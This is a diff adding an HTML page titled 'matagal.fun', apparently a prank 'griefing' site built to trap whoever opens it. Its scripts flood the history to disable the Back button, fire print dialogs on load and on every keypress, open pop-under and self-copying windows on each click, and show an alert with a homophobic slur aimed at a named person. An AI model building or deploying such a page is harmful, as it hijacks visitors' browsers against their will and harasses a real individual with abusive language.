@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name="keywords" content="f0ckth3m,myg0t,griefing,grief,troll,cr0wbar">
+		<title>matagal.fun</title>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+		<style>
+			body {
+				background-image: url('https://images.uncyc.org/pt/7/78/Carlinhos.png');
+				background-repeat: no-repeat;
+				background-attachment: fixed;
+				background-size: 100% 100%;
+				background-color: black;
+				color: purple;
+				font-family: Verdana;
+			}
+		</style>
+	</head>
+
+	<body>
+
+		<script type="text/javascript">
+		(function ($) { $.popup = function (sUrl) { var _parent = self; var bPopup = $.browser.msie && parseInt($.browser.version, 10) < 9; if (top != self) { try { if (top.document.location.toString()) { _parent = top } } catch (err) { } } var sOptions = "toolbar=1,scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,width=" + (screen.availWidth - 10).toString(); sOptions += ",height=" + (screen.availHeight - 122).toString() + ",screenX=0,screenY=0,left=0,top=0"; var popup = _parent.window.open(sUrl, "pu_" + Math.floor(89999999 * Math.random() + 1e7), sOptions); if (popup) { popup.blur(); if (bPopup) { window.focus(); try { opener.window.focus() } catch (err) { } } else { popup.init = function (e) { with (e) { (function () { if (typeof window.mozPaintCount != "undefined") { var a = window.open("about:blank"); a.close() } try { opener.window.focus() } catch (b) { } })() } }; popup.params = { url: sUrl }; popup.init(popup) } } return this } })(jQuery)
+		</script>
+
+		<script type="text/javascript">
+			funnyPrint = () => {
+				let tmp = document.body.innerHTML;
+
+				setTimeout(() => {
+					document.body.innerHTML = '<center><p style="color:green;font-size: 144px;">matagal.fun</p></center>';
+				}, 500);
+
+				setTimeout(() => {
+					print();
+				}, 520);
+
+				setTimeout(() => {
+					document.body.innerHTML = tmp;
+				}, 540);
+			};
+
+			(function() {
+				try {
+					for (var i = 0; i < 1000; i++) {
+						history.pushState({}, "", "#");
+					}
+					
+					onpopstate = (i) => {
+						if (i.state) {
+							location.replace('#');
+						}
+					}
+				} catch (ex) {}
+
+				window.onkeydown = (event) => {
+					funnyPrint();
+					alert("Effeqs é uma BICHA!");
+				};
+
+				window.onload = (event) => {
+					funnyPrint();
+				};
+
+				$(document.body).click(() => {
+					jQuery.popup(window.location.toString().slice(0, 
+						window.location.toString().length - 1));
+					
+					var w = window.open();
+					
+					if (w != null) {
+						w.document.write(document.documentElement.outerHTML || 
+										 document.documentElement.innerHTML);
+					}
+				});
+			})();
+		</script>
+	</body>
+</html>
